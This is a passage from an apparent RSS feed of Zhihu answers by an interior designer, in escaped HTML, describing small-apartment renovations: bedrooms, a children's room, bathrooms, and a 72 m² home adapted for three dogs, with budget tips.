data-private-watermark-src=\"v2-928c8b6985023f55eb6abfaf2933798d\"></p>\n<p><b>改造后卧室</b></p>\n<p><br></p>\n<p>对于卧室而言，功能性和舒适度永远都是首要的，而在有限的，开放的空间内，保证卧室的采光、隐私，更是极为重要。</p>\n<p>在米白色的公共区域分割出的卧室内，通过地面整体抬高榻榻米的设计，释放更大的地面空间，使其代替传统双人床，并在释放出的空间增加如“月光宝盒”般的收纳储物功能。</p>\n<p>同上述客厅沙发收纳，衣柜的同色设计使其关上门，乍看空无一物，最大程度的在视觉上，使人感觉卧室的整体空间被增大。</p>\n<p>在衣柜内，更根据长衣、短袖、私人衣物、冬夏衣物、被褥等不同分类通过层板等设计进行归置，这样即使再拥挤的空间，也不会让生活的动线紊乱。</p>\n<p>而卧室内侧通过窗帘切割的阳台，放置了办公与阅读所需的书架，阳台书桌方便放置笔记本等办公用具，窗外正临街景，在有限的条件内，给人以极大的便利与享受。</p>\n<p><br></p>\n<p><b>儿童房：</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-51eb962d00b35a4d8b2764e1417fb69c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-51eb962d00b35a4d8b2764e1417fb69c\" data-watermark-src=\"v2-7ff5c677396b10ea5f4aee330f3b68c9\" data-private-watermark-src=\"v2-034e8cd781bcdc314d03102349999ae7\"></p>\n<p><b>原始儿童房</b></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-34b7693eee7b180984b744d9d0db9f80_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-34b7693eee7b180984b744d9d0db9f80\" data-watermark-src=\"v2-d02a203e3d98def3f39c320a662474cd\" data-private-watermark-src=\"v2-62e2372c8a27ff43df32ac6447f3af19\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9cdb96c548b35d9ca866fa26a598b6a4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-9cdb96c548b35d9ca866fa26a598b6a4\" data-watermark-src=\"v2-488761fc17cd315a708a9191110f0573\" data-private-watermark-src=\"v2-a475264471e1a541afef10df2f14ed2e\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0e8ee396c2368d9a11d8423676d6db63_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"721\" data-watermark=\"watermark\" data-original-src=\"v2-0e8ee396c2368d9a11d8423676d6db63\" data-watermark-src=\"v2-ac46b6b60fb64890b14566a537384160\" data-private-watermark-src=\"v2-896010af8234978c18394c239e916557\"></p>\n<p><b>改造后儿童房</b></p>\n<p><br></p>\n<p>儿童房的使命不言而喻</p>\n<p>即陪伴孩子们度过自己的童年时光</p>\n<p>考虑到两个孩子的居住需求，儿童房采用上下床释放出更多的空间留给孩子活动，独立立柜分上下两层，灯饰同样如此，这方便孩子们住在上层也可以轻松关掉。</p>\n<p><br></p>\n<p><b>窗台边通长的书桌是孩子们的学习空间，两个孩子同时学习，并不会显得拥挤，两侧的书柜分别对应孩子们不同的阅读需求，遏制书籍混淆的情况发生。</b></p>\n<p>在整体的颜色上，它以米色、原木色为主，自然光的光泽度洒落在空间中，飘散着具温度的质感，轻抚流动于室内，使人一目了然，空间感、使用感、舒适度配搭得宜，孩子生活在这样的环境中，相信父母才会更加放心。</p>\n<p><br></p>\n<p><b>卫生间：</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-695f63254ff09dd414b311489367a92d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-695f63254ff09dd414b311489367a92d\" data-watermark-src=\"v2-613b330ded741f78f065671af7541ab3\" data-private-watermark-src=\"v2-d9a68f98dc95e00b9a9f497d8ca20ea5\"></p>\n<p>原始卫生间</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ed15b626d94ed14fee866c0b49da61eb_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"624\" data-rawheight=\"890\" data-watermark=\"watermark\" data-original-src=\"v2-ed15b626d94ed14fee866c0b49da61eb\" data-watermark-src=\"v2-60ce835fa6a21549d6e81486c846090f\" data-private-watermark-src=\"v2-26d405e10fed996af7252b8c1b359a2c\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-fcc94f9aef0217255eab795c8782b3c7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"887\" data-watermark=\"watermark\" data-original-src=\"v2-fcc94f9aef0217255eab795c8782b3c7\" data-watermark-src=\"v2-a5cd9563eaf4d311bd818a4c012ca925\" data-private-watermark-src=\"v2-279124f81dab237441514371f26e2a49\"></p>\n<p><br></p>\n<p>对于多人口来说，改造卫浴空间设计显得格外重要，合理的设计，让沐浴、洗漱、如厕各居一地，避免家庭成员引发清晨<b>“冲突”。</b></p>\n<p><b>马桶上侧的收纳柜，足以放下一家人的洗漱用品，通长台下盆的设计更易打理，节省空间外，同时节省更珍贵的时间。</b></p>\n<p>房间虽小，五脏俱全，家人的入住赋予其盎然的生机，而设计师合理的设计，正好裁剪其多余的蓬勃欲，使它精而细，小却美，简单不失安逸。</p>\n<p>房间虽小，温暖满溢，分置得当，照顾好每一位亲爱的家人，生活才会更加美好。</p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/331434969/answer/2072861246?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">352 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/340885904?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问去哪里、跟谁学习系统的整理收纳师课程比较靠谱？</a><br><a href=\"http://www.zhihu.com/question/336529331?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">可以把你们的桌面发给我看吗？想学学如何收纳?</a><br>\n","link":"http://www.zhihu.com/question/331434969/answer/2072861246?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"长条小户型怎么合理装修布局？","date":"2021-09-09 11:21:59","description":"\n<p>北京57平长条小户型爆改案例，希望可以带给你一些灵感！</p>\n<p>【设计需求】：<br>①主卧希望改成集客厅、起居室、观影区、办公区、储物间为一体的多功能房；<br>②厨房希望是开放式的，同时兼具餐厅功能；<br>③次卧需要满足女儿未来10年的居住需求，要有学习必备基础设施摆放空间；<br>④需要设计一组上下床，解决老人临时居住问题；<br>⑤男主对灯光方面要求高，希望光源设计更细腻;<br>⑥对储物空间需求比较大，尽量为隐藏式；<br>⑦卫生间布局不合理，希望设计成日式三分离；<br>⑧要布置小型佛龛，预留空间不需要很大，注意不要对着主卧的床位；<br>⑨男主对睡眠环境要求高，需要用抗噪和环保性材料；</p>\n<p>【设计亮点】：</p>\n<p>①墙板缝隙之间安装了灯带，满足灯光照明需求；</p>\n<p>②柜体的设计满足床头东西收纳功能；</p>\n<p>③设专区，可供佛，干净整洁；</p>\n<p>④入户鞋柜解决回家换鞋及收纳功能，开放格方便归置小物；</p>\n<p>⑤玻璃隔断使得白天采光充足空间通透，视觉上空间通透明亮不拥挤；</p>\n<p>⑥层板的设计满足投影仪与体感游戏机等设备放置；</p>\n<p>⑦土间放置衣架，经济实惠，增加收纳；</p>\n<p>⑧淋浴间使用磨砂背漆玻璃门，防水性好并且隐私性高。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e2190ad84b26f2ed3b2ef06b1971f5e0_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"341\" data-watermark=\"watermark\" data-original-src=\"v2-e2190ad84b26f2ed3b2ef06b1971f5e0\" data-watermark-src=\"v2-3437c1b08afc909ec3b1b063eb610ea6\" data-private-watermark-src=\"v2-a706be4d5377624f6e6eb4ccbd397302\"></p>\n<p>户型图</p>\n<p><img src=\"https://pic3.zhimg.com/v2-055457f55b7d08300eb09948f998f38e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"324\" data-watermark=\"watermark\" data-original-src=\"v2-055457f55b7d08300eb09948f998f38e\" data-watermark-src=\"v2-eab8d3b362222975e35064b4198256ef\" data-private-watermark-src=\"v2-402e6e4d43dff6e9de1df471a6bae0dc\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b0a5f0231472525842dee76f702b08a7_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"657\" data-rawheight=\"270\" data-watermark=\"watermark\" data-original-src=\"v2-b0a5f0231472525842dee76f702b08a7\" data-watermark-src=\"v2-3fe42286d33a55da31d54cfe3c0b2f13\" data-private-watermark-src=\"v2-6e3e9d26baf92bd1fe7afce073b4993f\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3d051ddafc1da90c044adbe838f3c77f_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"547\" data-watermark=\"watermark\" data-original-src=\"v2-3d051ddafc1da90c044adbe838f3c77f\" data-watermark-src=\"v2-8131c1b052cab4f79108afa4dfcdf60b\" data-private-watermark-src=\"v2-046625d5d5346866b44be012c5eb99f1\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d09e8f81399a96f2d58154aed6cfa157_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"388\" data-watermark=\"watermark\" data-original-src=\"v2-d09e8f81399a96f2d58154aed6cfa157\" data-watermark-src=\"v2-7c3c36500d6ca7085a5b0f43e94b3ec3\" data-private-watermark-src=\"v2-81586c112667e6aa9bc33034f8b9e19a\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/367327021/answer/2087469045?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">6 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/383323077?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型如何装修 尤其是客厅?</a><br><a href=\"http://www.zhihu.com/question/348943705?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型怎么设计啊 客厅太小了？</a><br>\n","link":"http://www.zhihu.com/question/367327021/answer/2087469045?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"小户型房子如何装修看起来不廉价？","date":"2021-09-09 11:21:41","description":"\n<p>实用和好看，收纳和色彩搭配。可以看看这套案例，能不能给你一些灵感，72平两居（常住两个大人+三个毛孩儿）的改造案例。</p>\n<p>对于这个案例的改造，屋主希望在视觉不太拥挤的前提下拥有更多的储物空间，三只毛孩儿的玩耍空间也尽量宽敞，客厅满足看电影和放松休闲，卧室只需做好隔音隔光，保证良好的睡眠即可，整个新家显得更现代，更宽敞简洁。</p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-d87eda51f1095d812d35f8bb79023643_720w.jpg?rss\" data-caption=\"原始户型平面图vs改造后平面图\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"619\" data-watermark=\"watermark\" data-original-src=\"v2-d87eda51f1095d812d35f8bb79023643\" data-watermark-src=\"v2-8fc559bc420fa181c42b6405f33ec670\" data-private-watermark-src=\"v2-250b3f348e4e9fdaacbbd27056c9479a\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-deb91789b973dd7cf95b370584694f04_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"619\" data-watermark=\"watermark\" data-original-src=\"v2-deb91789b973dd7cf95b370584694f04\" data-watermark-src=\"v2-02af337c968911ae57c2b259a10b8ffb\" data-private-watermark-src=\"v2-f59aa8c24d9e8d4c59339a3e539b67a1\"></p>\n<p><b>- 原始户型 -</b></p>\n<p>• 玄关面积较小，储存空间不到位；</p>\n<p>• 客厅杂物等没有足够空间储存，也没有展示区；</p>\n<p>• 原空间动线单一，公共区域面积较小，三只狗狗的活动空间太拥挤；</p>\n<p>• 狗狗平时得在马桶上进行日常擦洗，没有专用的清洗空间；</p>\n<p>• 卫生间为暗卫，采光不好。</p>\n<p><br></p>\n<p><b> - 改造亮点 - </b></p>\n<p>• 玄关两面墙都做了收纳柜，搭配洞洞板，有效提升储物功能；</p>\n<p>• 打通次卧并入客厅，改造成多功能室，公共空间变开阔；</p>\n<p>• 室内动线变流畅，空间更通透；</p>\n<p>• 全屋细节收纳，可最大限度上保持视觉简洁；</p>\n<p>• 卫生间三分离处理，暗卫变明卫。并增加狗狗擦洗专用折叠桌板，使用方便。</p>\n<p><br></p>\n<p><b>打造极致收纳 </b></p>\n<p>玄关 | 隐形柜+置物洞洞板</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0fcb81a18047dcd6b3ee1b0d5446f7f6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1495\" data-watermark=\"watermark\" data-original-src=\"v2-0fcb81a18047dcd6b3ee1b0d5446f7f6\" data-watermark-src=\"v2-923df93d6f6c95ddeeb7ad7b951a50f8\" data-private-watermark-src=\"v2-4a34216e18468d406a0eaa2b84bff48f\"></p>\n<p>玄关作为进入室内的第一站，也是打造收纳的重要区域，原始户型没有在这里做任何规划，造成了极大的浪费，改造后，一侧做了整墙的隐形柜体设计，依次可储存鞋子和狗狗常用的物品，另一侧规划了超大穿衣镜与整面洞洞板，不光方便了收纳，目之所及，更是显得干净整洁。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-bd1c3fb4859856816d30dd749af2d2df_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-bd1c3fb4859856816d30dd749af2d2df\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-db5249ad8ed2d33ebc9a540c6e34df3b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-db5249ad8ed2d33ebc9a540c6e34df3b\" data-watermark-src=\"v2-2416f451947ad99de269d325e72f17ad\" data-private-watermark-src=\"v2-88c21a19f01d190ccc965b3049097e4b\"></p>\n<p>穿衣镜后方内嵌灯带，轻松辅助空间照明，而且洞洞板下方安装了折叠换鞋凳，方便进出换鞋，不用时可直接收起，节约空间。</p>\n<p><b>动线更优 客餐厅一体化 </b></p>\n<p>客厅+餐厅</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5a8cffecd13cc34f975645acaafe6070_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"727\" data-watermark=\"watermark\" data-original-src=\"v2-5a8cffecd13cc34f975645acaafe6070\" data-watermark-src=\"v2-aa7b0c42755e6ef1b0b3115a343e9c0f\" data-private-watermark-src=\"v2-dede2f32aa887b1657d4b86e1b930478\"></p>\n<p>客厅陈设较为简单，以大面积的白色和木质色调为基调，再以局部的灰色点缀，内敛简洁。考虑到毛孩子需要无障碍的空间进行活动，所以客厅没有采用传统的茶几，而是用一把轻盈的边几用来辅助置物需求，随用随挪。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac7a2777ab4d8210631b522c4fb1f0d6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"726\" data-watermark=\"watermark\" data-original-src=\"v2-ac7a2777ab4d8210631b522c4fb1f0d6\" data-watermark-src=\"v2-cd36db43a5b049c98c6bc0bf5f548a3f\" data-private-watermark-src=\"v2-99187c13323f7c560d07da07d78c70f5\"></p>\n<p>客厅的立面空间也不能浪费，整个墙面延伸了玄关柜体的风格，大面积的白色铺陈，简洁大方，尽头设圆弧型开放格，可做展示架使用，视觉上比锐利的直角造型柜更柔和，并且下方正好归置扫地机器人。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f166676cf8dd9aafccbbf9a3ec90933f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"652\" data-watermark=\"watermark\" data-original-src=\"v2-f166676cf8dd9aafccbbf9a3ec90933f\" data-watermark-src=\"v2-93c44d22ef84870f8e234f95eef70c7a\" data-private-watermark-src=\"v2-89960a1462ba4dfa7092d10d228be6f6\"></p>\n<p>沙发正对面的白墙没有放电视，而是打造了绝佳的观影区域，大面积的幕布投放毫无压力，结合后方的灯带环境，营造出了错落有致的层次感。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-30a1eaa78947cfd8b194f28f70428a22_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1524\" data-watermark=\"watermark\" data-original-src=\"v2-30a1eaa78947cfd8b194f28f70428a22\" data-watermark-src=\"v2-4c684b0027e543feb7eb07bcb85b50fc\" data-private-watermark-src=\"v2-a2b036959e9b88765b6be03efc28b0a4\"></p>\n<p>沙发另一侧是一个小小的飘窗区，可用作临时的休憩之地，一杯咖啡+一本好书，能让人在此安静享受整个下午。</p>\n<p><b>优化采光  补充公共区域 </b></p>\n<p>多功能室 + 榻榻米</p>\n<p><img src=\"https://pic2.zhimg.com/v2-15c8d982b8adf55ac23e5097767088c6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"700\" data-watermark=\"watermark\" data-original-src=\"v2-15c8d982b8adf55ac23e5097767088c6\" data-watermark-src=\"v2-54468d0f44f69df480a2202b783e08fe\" data-private-watermark-src=\"v2-99e218c4d42875a804137f2624075b30\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c9372b21470b652becc2eda5eb62b60f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"670\" data-watermark=\"watermark\" data-original-src=\"v2-c9372b21470b652becc2eda5eb62b60f\" data-watermark-src=\"v2-ccadc5d3651df08f48c7d8ed1a09847e\" data-private-watermark-src=\"v2-2ead6966782500def675bee7e4a7f3be\"></p>\n<p>打通壁垒后的墙面更加连贯开阔，想要使家里的储存空间最大化地利用，又不过于杂乱，最好的办法是因地制宜做定制储物柜，于是利用立面空间分别部署了工作区、展示柜与水吧台，空间属性也因此变得丰富起来。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2e71772a859ee7b11d392169581e1b88_720w.gif?rss\" data-caption=\"△展示柜与水吧台之间做了一面抽拉式收纳架平时可以存放零食饮料，供随时取用\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-2e71772a859ee7b11d392169581e1b88\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>为了最大化释放空间，尽可能地给毛孩子们创造更开阔的活动区域，拆除了次卧与客厅的隔墙，原本的次卧位置被改造成了多功能室，整屋南北方向更加通透，居住感受变得更加舒适。水吧台的位置可以放一些小家电，例如咖啡机、豆浆机、早餐机等，墙面装了滑轨插座，颜值在线，并可满足多台电器同时使用。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dcfb4ac8b39bd21be7b6c0858e9f22be_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-dcfb4ac8b39bd21be7b6c0858e9f22be\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>多功能区靠近窗户的位置，打造了一个榻榻米床，而且为了取用方便，下方做的是3个拉屉的设计，两边的柜子的的收纳储量也很大，大件不常用的物品整理好储放到柜门里，既美观又实用。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1e4d2b9cf5f660d096687c6e754f9414_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1233\" data-watermark=\"watermark\" data-original-src=\"v2-1e4d2b9cf5f660d096687c6e754f9414\" data-watermark-src=\"v2-ef37fd7e6213fb95c84c757a9e6f6c9f\" data-private-watermark-src=\"v2-7708a332640c14bb59f6991c58e3b272\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-960e89d8cd996c3c49402ff66ec20242_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-960e89d8cd996c3c49402ff66ec20242\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><b>双排操作台  省时又省力</b></p>\n<p>厨房+小阳台</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3f1220a423436709d8f803f14476aaa9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1511\" data-watermark=\"watermark\" data-original-src=\"v2-3f1220a423436709d8f803f14476aaa9\" data-watermark-src=\"v2-9562976c52c2cdc061ebf13dca7180fb\" data-private-watermark-src=\"v2-334d22c323914e9df5a0bf8f65c97abe\"></p>\n<p>双一字型布局与现有的厨房条件更契合，从左到右，依次可做到洗、切、煎、炒等操作，动线流畅。厨房的一端连接小阳台，让厨房的采光更通透。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-b99fa5ab93324bf69ef3fcac33967c07_720w.gif?rss\" data-caption=\"△ 灶台边的调味瓶统统放到这个伸缩架上平时不用的时候就收起来，保持台面整洁\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-b99fa5ab93324bf69ef3fcac33967c07\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>厨房的每一寸空间也得到了合理利用，上下柜体收纳充足，将厨具和大件用品按照使用方式分门别类，最大化释放了台面的操作面积。</p>\n<p><b>双侧衣橱 大量储物</b></p>\n<p>卧室+储物衣柜<br></p>\n<p>卧室的两面墙都做了衣柜，进门的地面做了抬高处理，床内嵌于地台之中，整体简洁有序，也增加了卧室的空间层次感。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d16dd08d2de46f3a5ed43468d90b68f6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"743\" data-watermark=\"watermark\" data-original-src=\"v2-d16dd08d2de46f3a5ed43468d90b68f6\" data-watermark-src=\"v2-1ddde3e19adb14d17cbdfbb587fc4f63\" data-private-watermark-src=\"v2-147bccbfdcbf46276a408c7156ac4e80\"></p>\n<p>衣柜上方是3D风口空调，一般中央空调出风口都是格栅状的，风口方向需要手动调节，而这种3D风口的舒适性就更高了，风口可以通过控制器实现上下左右调节，将气流均匀打散送至房间每个角落，并可智能监测人数位置，避开对着人直吹。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-4a71515eb5ffdc2bcdee19bf734ed4e1_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"720\" data-watermark=\"watermark\" data-original-src=\"v2-4a71515eb5ffdc2bcdee19bf734ed4e1\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>折叠加推拉式柜门是特别定制的，柜内还贴心地配上了感应灯，让衣物的拿取变得轻松自如。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-32124fb8c25b4ce9066253ee8e1a982e_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-32124fb8c25b4ce9066253ee8e1a982e\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>卧室门口正对的墙面，也做了收纳柜，左侧为挂衣区，方便进出换衣，右侧专门用来收纳当季正在穿的鞋子。</p>\n<p><b>三式分离  暗卫变明卫</b></p>\n<p>卫生间 + 折叠板</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fa05ba9fa7e9ab041ac940284f3cbef6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1492\" data-watermark=\"watermark\" data-original-src=\"v2-fa05ba9fa7e9ab041ac940284f3cbef6\" data-watermark-src=\"v2-3ce97ae0472e3b2cb93e081ffb580a6d\" data-private-watermark-src=\"v2-6dac44450300a9e7b86344a0dcc9da38\"></p>\n<p>原户型的卫生间是暗卫，白天进去必须开灯；改造后，将洗手台从卫生间“释放”出来，不仅真正实现了干湿分离，还优化了日常需求动线，有效提高了空间利用率。原卫生间为普通平开门，使用面积狭窄，改造后使用折叠门，灵活实现空间的分隔和独立。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9aa25ba42b46245eb65131b4b15d8cf6_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"640\" data-rawheight=\"360\" data-watermark=\"watermark\" data-original-src=\"v2-9aa25ba42b46245eb65131b4b15d8cf6\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-223efc55f3f64314d4a649f54624bd50_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-223efc55f3f64314d4a649f54624bd50\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>卫生间最大的改造亮点便是这个折叠桌板了，现在可以直接在这个专区上清理狗狗身上的污垢。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-2d2b03646366e4edec78686236225442_720w.gif?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"960\" data-watermark=\"watermark\" data-original-src=\"v2-2d2b03646366e4edec78686236225442\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>洗手台左侧的淋浴区，墙面材质为仿水泥砖，质感高级，花洒旁边设置壁龛，正好可收纳洗漱用品，并且采用了电动雾化玻璃作为与客厅的隔断，既解决了原本暗卫采光不便的难题，又能很好地保护隐私。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-28d0ffe2c8b8a32e5c6c8ecdfcce97de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"820\" data-watermark=\"watermark\" data-original-src=\"v2-28d0ffe2c8b8a32e5c6c8ecdfcce97de\" data-watermark-src=\"v2-853050377e39bf9b2677411243b1afd6\" data-private-watermark-src=\"v2-e4c29711c683cdb748dfc446c3d8f1a8\"></p>\n<p>最后，此案例的一些设计亮点和收纳思路，可供做为鉴赏，然后进行取舍。预算有限的情况下，我给你几条个人建议：</p>\n<p>第一条：比如全屋定制 地板 涂料等大面积铺的品类，可以选择稍微好一些的品牌（牵扯到甲醛等环境问题），像一些小件主材，可以选择购买便宜且实用的品牌。</p>\n<p>第二条：可以去宜家淘一些卖的比较火的小件家具。（宜家冰激淋可以尝尝看）</p>\n<p>第三条：多购买一些小家电，如三明治机 榨汁机等等，在家多做点饭，而不是要外卖，更可以提升生活情调或者是品质。</p>\n<p>第四条：投影和百叶窗用的得当，可以最大程度提升整体居家生活氛围。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ryan-wang-heng?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">设计师Ryan王恒</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/338558347/answer/2099093481?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">188 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/311450649?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">小户型两室一厅57平怎么装修？</a><br><a href=\"http://www.zhihu.com/question/346429351?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" 